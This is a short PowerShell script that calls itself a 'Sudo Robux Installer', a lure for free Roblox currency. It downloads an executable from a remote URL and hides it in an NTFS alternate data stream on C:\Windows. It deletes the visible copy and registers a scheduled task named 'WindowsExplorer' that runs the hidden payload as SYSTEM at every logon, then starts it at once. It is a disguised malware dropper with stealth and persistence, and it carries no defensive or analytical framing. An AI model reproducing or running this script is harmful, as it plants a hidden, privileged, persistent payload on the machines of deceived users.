Clear-Host
Write-Host "Sudo Robux Installer" -ForegroundColor Magenta -NoNewLine
Write-Host " by Hadron" -ForegroundColor DarkGray
Write-Host
Write-Host "Downloading..." -ForegroundColor DarkCyan
curl https://raw.githubusercontent.com/HadronCollision/SudoRobux/refs/heads/main/WindowsExplorer.exe -o russianhuzz
Write-Host "Installing..." -ForegroundColor DarkCyan
cmd.exe /c "type russianhuzz > C:\Windows:Explorer"
rm .\russianhuzz
$action = New-ScheduledTaskAction -Execute "C:\Windows\System32\cmd.exe /c wmic process call create C:\Windows:Explorer"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 1000000
Register-ScheduledTask -TaskName "WindowsExplorer" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" > $null 2>&1
schtasks /run /tn WindowsExplorer > $null 2>&1
Write-Host
